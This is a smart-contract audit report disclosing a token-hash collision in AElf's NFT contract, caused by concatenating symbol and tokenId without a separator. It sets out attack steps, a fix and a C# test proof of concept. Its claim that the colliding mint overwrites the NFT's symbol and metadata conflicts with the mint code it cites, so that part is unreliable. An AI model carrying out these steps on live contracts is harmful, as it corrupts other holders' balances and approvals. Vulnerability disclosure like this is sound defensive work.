# Audit Report

## Title
Token Hash Collision Vulnerability via Symbol Manipulation Enables NFT Data Corruption

## Summary
The NFT contract's `CalculateTokenHash()` function uses naive string concatenation without a separator, allowing different (symbol, tokenId) pairs to produce identical hashes. Attackers can exploit MultiToken's permissive NFT symbol validation to create protocols with hyphenated symbols like "AR-12" and "AR-1", then mint NFTs with specific tokenIds that collide (e.g., tokenId 3 and 23 both produce hash "AR-123"). This causes critical NFT state corruption across balances, allowances, metadata, and ownership records.

## Finding Description

The vulnerability stems from three interconnected design flaws:

**1. Naive Hash Calculation Without Separator**

The `CalculateTokenHash()` function performs direct string concatenation without any delimiter between the symbol and tokenId: [1](#0-0) 

This produces identical hashes for mathematically distinct inputs: concatenating "AR-12" with "3" yields "AR-123", identical to concatenating "AR-1" with "23".

**2. MultiToken Permits Hyphenated NFT Symbols**

The MultiToken contract's symbol validation accepts NFT item symbols with hyphens. The `GetSymbolType()` function splits on the hyphen separator and validates each part independently: [2](#0-1) 

The hyphen separator is defined as: [3](#0-2) 

When creating NFT items, `AssertValidCreateInput` returns early for NFT type, bypassing additional symbol format validation: [4](#0-3) 

The early return at line 280 allows symbols like "AR-12" and "AR-1" to be created after their collection "AR-0" exists. Both symbols pass validation because they split into valid PREFIX-ITEMID pairs where PREFIX matches `^[a-zA-Z0-9]+$` and ITEMID matches `^[0-9]+$`: [5](#0-4) [6](#0-5) 

**3. NFT Contract Accepts Any Valid MultiToken Symbol**

The `CrossChainCreate` method only validates that the first 2 characters match a valid NFT type prefix: [7](#0-6) 

This substring-based validation allows both "AR-12" and "AR-1" to be registered as distinct NFT protocols since they share the "AR" prefix (mapped to "Art" NFT type): [8](#0-7) 

**Attack Execution Path:**

1. Attacker creates NFT collection "AR-0" in MultiToken contract
2. Attacker creates NFT items "AR-12" and "AR-1" in MultiToken (both valid since collection exists)
3. Attacker calls `NFT.CrossChainCreate` for both symbols (passes 2-char prefix validation)
4. Attacker mints NFT with symbol "AR-12" and tokenId 3 → stores at `Hash("AR-123")`
5. Attacker mints NFT with symbol "AR-1" and tokenId 23 → overwrites/shares state at `Hash("AR-123")`

**State Corruption Occurs Across All Token-Hash-Keyed Mappings:**

The NFT contract stores all NFT state using tokenHash as the primary key: [9](#0-8) 

The same collision affects all operations:

- Minting uses tokenHash to store NFT info and balances: [10](#0-9) 

- Balance queries: [11](#0-10) 

- Allowance management: [12](#0-11) 

- Transfer operations: [13](#0-12) 

- Assembly data: [14](#0-13) 

## Impact Explanation

**Critical Security Invariant Violated:** Each NFT must have a globally unique identifier to maintain ownership integrity and prevent asset confusion.

**Concrete Harms:**

1. **NFT Metadata Overwriting**: When minting with colliding tokenHashes, the `State.NftInfoMap[tokenHash]` gets overwritten, destroying the symbol, minters, metadata, quantity, URI, and alias of earlier NFTs
2. **Balance Corruption**: `State.BalanceMap[tokenHash][owner]` aggregates balances from different protocols - users see incorrect holdings that combine assets from multiple unrelated NFT protocols
3. **Cross-Protocol Transfer Vulnerability**: Transferring "AR-12:3" deducts from the shared balance at the colliding tokenHash, unintentionally affecting "AR-1:23" holders
4. **Allowance Confusion**: Approvals granted for one NFT inadvertently grant permissions for another NFT from a completely different protocol
5. **Assembly Data Conflicts**: Assembled NFT records at `State.AssembledNftsMap[tokenHash]` get mixed between protocols, corrupting assembly/disassembly operations

**Affected Parties:** All users holding or interacting with NFTs from any protocol that has colliding tokenHashes, including innocent third parties not involved in the attack.

**Severity Justification:** This is a **HIGH** severity vulnerability because it directly compromises the fundamental uniqueness property of NFTs, enables cross-protocol asset manipulation, and has cascading effects on ownership, transfers, and approvals.

## Likelihood Explanation

**Attacker Capabilities Required:**
1. Call `MultiToken.Create` to establish NFT collection "X-0" (public method, requires standard fees)
2. Call `MultiToken.Create` for NFT items "X-AB" and "X-A" where AB and A are numeric suffixes (public method)
3. Call `NFT.CrossChainCreate` to register both symbols (public method, validates token exists in MultiToken)
4. Call `NFT.Mint` with pre-calculated tokenIds that produce collisions (public method, requires minter permission which the protocol creator controls)

**Attack Complexity:** LOW - The collision is deterministic and pre-calculable. An attacker simply needs to:
- Choose symbol pair where first 2 chars match valid NFT type (e.g., "AR-1" and "AR-12")
- Calculate collision: if "AR-1" + tokenId = "AR-12" + X, then tokenId = "2" + X
- Example: "AR-1" + "23" = "AR-12" + "3" = "AR-123"

**Feasibility Conditions:**
- MultiToken's `CreateNFTInfo` permits hyphenated symbols after collection creation (validated in code)
- NFT's `CrossChainCreate` only checks 2-char prefix, not full symbol format (validated in code)
- No separator in `CalculateTokenHash` makes collisions trivial (validated in code)
- No cross-protocol collision detection exists

**Probability:** HIGH - All required methods are public, preconditions are easily satisfiable, and the mathematical collision is guaranteed. The attacker has full control over their own malicious protocols and can orchestrate the collision at will.

## Recommendation

**Solution: Add a Separator in CalculateTokenHash**

Modify the hash calculation to include a delimiter that cannot appear in valid symbols:

```csharp
private Hash CalculateTokenHash(string symbol, long tokenId)
{
    return HashHelper.ComputeFrom($"{symbol}:{tokenId}");
}
```

Since MultiToken NFT symbols follow the format `PREFIX-ITEMID` where PREFIX is alphanumeric and ITEMID is numeric, using `:` as a separator ensures "AR-12:3" and "AR-1:23" produce different hashes.

**Alternative Solutions:**

1. **Validate Symbol Format in CrossChainCreate**: Add comprehensive validation to reject symbols with multiple hyphens or ensure the symbol format matches the expected NFT protocol pattern
2. **Use Structured Hashing**: Hash the symbol and tokenId separately then combine:
```csharp
return HashHelper.ConcatAndCompute(
    HashHelper.ComputeFrom(symbol),
    HashHelper.ComputeFrom(tokenId)
);
```

## Proof of Concept

```csharp
[Fact]
public async Task TokenHashCollisionTest()
{
    // Step 1: Create NFT collection "AR-0" in MultiToken
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = "AR-0",
        TokenName = "Art Collection",
        TotalSupply = 1000000,
        Decimals = 0,
        Issuer = DefaultAddress,
        IsBurnable = true,
        IssueChainId = ChainHelper.ConvertBase58ToChainId("AELF")
    });

    // Step 2: Create NFT items "AR-12" and "AR-1"
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = "AR-12",
        TokenName = "Art Item 12",
        TotalSupply = 100,
        Decimals = 0,
        Issuer = DefaultAddress,
        Owner = DefaultAddress,
        IsBurnable = true,
        IssueChainId = ChainHelper.ConvertBase58ToChainId("AELF")
    });

    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = "AR-1",
        TokenName = "Art Item 1",
        TotalSupply = 100,
        Decimals = 0,
        Issuer = DefaultAddress,
        Owner = DefaultAddress,
        IsBurnable = true,
        IssueChainId = ChainHelper.ConvertBase58ToChainId("AELF")
    });

    // Step 3: Register both in NFT contract
    await NFTContractStub.CrossChainCreate.SendAsync(new CrossChainCreateInput { Symbol = "AR-12" });
    await NFTContractStub.CrossChainCreate.SendAsync(new CrossChainCreateInput { Symbol = "AR-1" });

    // Step 4: Mint with colliding tokenIds
    var hash1 = await NFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = "AR-12",
        TokenId = 3,
        Owner = DefaultAddress,
        Quantity = 1
    });

    var hash2 = await NFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = "AR-1",
        TokenId = 23,
        Owner = DefaultAddress,
        Quantity = 1
    });

    // Verify collision: both should produce "AR-123"
    var calculatedHash1 = await NFTContractStub.CalculateTokenHash.CallAsync(new CalculateTokenHashInput
    {
        Symbol = "AR-12",
        TokenId = 3
    });

    var calculatedHash2 = await NFTContractStub.CalculateTokenHash.CallAsync(new CalculateTokenHashInput
    {
        Symbol = "AR-1",
        TokenId = 23
    });

    // COLLISION DETECTED: Both hashes are identical
    calculatedHash1.ShouldBe(calculatedHash2);

    // Demonstrate state corruption: querying NFT info returns the last minted NFT
    var nftInfo = await NFTContractStub.GetNFTInfoByTokenHash.CallAsync(calculatedHash1);
    nftInfo.Symbol.ShouldBe("AR-1"); // Overwrites earlier "AR-12" data
}
```

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L23-24)
```csharp
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        DoTransfer(tokenHash, Context.Sender, input.To, input.Amount);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L176-178)
```csharp
        if (input.AssembledNfts.Value.Any()) State.AssembledNftsMap[nftMinted.TokenHash] = input.AssembledNfts;

        if (input.AssembledFts.Value.Any()) State.AssembledFtsMap[nftMinted.TokenHash] = input.AssembledFts;
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L297-298)
```csharp
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        State.AllowanceMap[tokenHash][Context.Sender][input.Spender] = input.Amount;
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L330-333)
```csharp
    private Hash CalculateTokenHash(string symbol, long tokenId)
    {
        return HashHelper.ComputeFrom($"{symbol}{tokenId}");
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L393-441)
```csharp
        var tokenHash = CalculateTokenHash(input.Symbol, tokenId);
        var nftInfo = State.NftInfoMap[tokenHash];
        if (!protocolInfo.IsTokenIdReuse || isTokenIdMustBeUnique)
            Assert(nftInfo == null, $"Token id {tokenId} already exists. Please assign a different token id.");

        var minterList = GetMinterList(tokenInfo);
        Assert(minterList.Value.Contains(Context.Sender), "No permission to mint.");
        Assert(tokenInfo.IssueChainId == Context.ChainId, "Incorrect chain.");

        var quantity = input.Quantity > 0 ? input.Quantity : 1;
        protocolInfo.Supply = protocolInfo.Supply.Add(quantity);
        protocolInfo.Issued = protocolInfo.Issued.Add(quantity);
        Assert(protocolInfo.Issued <= protocolInfo.TotalSupply, "Total supply exceeded.");
        State.NftProtocolMap[input.Symbol] = protocolInfo;

        // Inherit from protocol info.
        var nftMetadata = protocolInfo.Metadata.Clone();
        if (input.Metadata != null)
            foreach (var pair in input.Metadata.Value)
                if (!nftMetadata.Value.ContainsKey(pair.Key))
                    nftMetadata.Value[pair.Key] = pair.Value;

        if (nftInfo == null)
        {
            nftInfo = new NFTInfo
            {
                Symbol = input.Symbol,
                Uri = input.Uri ?? string.Empty,
                TokenId = tokenId,
                Metadata = nftMetadata,
                Minters = { Context.Sender },
                Quantity = quantity,
                Alias = input.Alias

                // No need.
                //BaseUri = protocolInfo.BaseUri,
                //Creator = protocolInfo.Creator,
                //ProtocolName = protocolInfo.ProtocolName
            };
        }
        else
        {
            nftInfo.Quantity = nftInfo.Quantity.Add(quantity);
            if (!nftInfo.Minters.Contains(Context.Sender)) nftInfo.Minters.Add(Context.Sender);
        }

        State.NftInfoMap[tokenHash] = nftInfo;
        var owner = input.Owner ?? Context.Sender;
        State.BalanceMap[tokenHash][owner] = State.BalanceMap[tokenHash][owner].Add(quantity);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFTHelper.cs (L7-14)
```csharp
    private SymbolType GetSymbolType(string symbol)
    {
        var words = symbol.Split(TokenContractConstants.NFTSymbolSeparator);
        Assert(words[0].Length > 0 && IsValidCreateSymbol(words[0]), "Invalid Symbol input");
        if (words.Length == 1) return SymbolType.Token;
        Assert(words.Length == 2 && words[1].Length > 0 && IsValidItemId(words[1]), "Invalid NFT Symbol input");
        return words[1] == TokenContractConstants.CollectionSymbolSuffix ? SymbolType.NftCollection : SymbolType.Nft;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContractConstants.cs (L19-19)
```csharp
    public const char NFTSymbolSeparator = '-';
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L23-26)
```csharp
    private bool IsValidItemId(string symbolItemId)
    {
        return Regex.IsMatch(symbolItemId, "^[0-9]+$");
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L28-31)
```csharp
    private bool IsValidCreateSymbol(string symbol)
    {
        return Regex.IsMatch(symbol, "^[a-zA-Z0-9]+$");
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L272-283)
```csharp
    private void AssertValidCreateInput(CreateInput input, SymbolType symbolType)
    {
        Assert(input.TokenName.Length <= TokenContractConstants.TokenNameLength
               && input.Symbol.Length > 0
               && input.Decimals >= 0
               && input.Decimals <= TokenContractConstants.MaxDecimals, "Invalid input.");

        CheckSymbolLength(input.Symbol, symbolType);
        if (symbolType == SymbolType.Nft) return;
        CheckTokenAndCollectionExists(input.Symbol);
        if (IsAddressInCreateWhiteList(Context.Sender)) CheckSymbolSeed(input.Symbol);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L89-93)
```csharp
        var nftTypeShortName = input.Symbol.Substring(0, 2);
        var nftTypeFullName = State.NFTTypeFullNameMap[nftTypeShortName];
        if (nftTypeFullName == null)
            throw new AssertionException(
                $"Full name of {nftTypeShortName} not found. Use AddNFTType to add this new pair.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Helpers.cs (L45-45)
```csharp
        nftTypes.Value.Add("AR", NFTType.Art.ToString());
```

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L17-33)
```csharp
    public MappedState<Hash, NFTInfo> NftInfoMap { get; set; }

    /// <summary>
    ///     Token Hash -> Owner Address -> Balance
    /// </summary>
    public MappedState<Hash, Address, long> BalanceMap { get; set; }

    public MappedState<string, NFTProtocolInfo> NftProtocolMap { get; set; }

    /// <summary>
    ///     Token Hash -> Owner Address -> Spender Address -> Approved Amount
    ///     Need to record approved by whom.
    /// </summary>
    public MappedState<Hash, Address, Address, long> AllowanceMap { get; set; }

    public MappedState<Hash, AssembledNfts> AssembledNftsMap { get; set; }
    public MappedState<Hash, AssembledFts> AssembledFtsMap { get; set; }
```
